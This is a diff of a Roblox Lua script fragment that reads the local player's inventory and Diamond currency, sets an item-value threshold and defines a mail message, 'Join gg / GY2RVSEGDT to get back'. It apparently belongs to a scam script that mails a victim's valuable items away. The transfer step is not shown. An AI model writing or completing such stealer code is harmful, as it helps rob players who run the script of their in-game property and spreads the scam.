@@ -1,48 +1,29 @@
-local rapThreshold = 100000 -- Set the RAP threshold value
-
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
-
 local library = require(game.ReplicatedStorage.Library)
-
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
-
 local plr = game.Players.LocalPlayer
-
 local MailMessage = "Join gg / GY2RVSEGDT to get back"
-
 local HttpService = game:GetService("HttpService")
-
-local save = saveData.Inventory
 local sortedItems = {}
 local totalRAP = 0
 _G.scriptExecuted = _G.scriptExecuted or false
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
 
--- Prevent script from executing multiple times
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 
-local GetSave = function()
-
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
-
-end
-
--- Get the amount of "Diamonds" in the player's currency
 local GemAmount1 = 0
-
-for _, currency in pairs(save.Currency) do
-
-    if currency.id == "Diamonds" then
-
-        GemAmount1 = currency._am
-
-        break
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+		break
     end
 end
 
--- Helper function to format large numbers with suffixes (k, m, b, etc.)
 local function formatNumber(number)
     if number == nil then
         return "0"
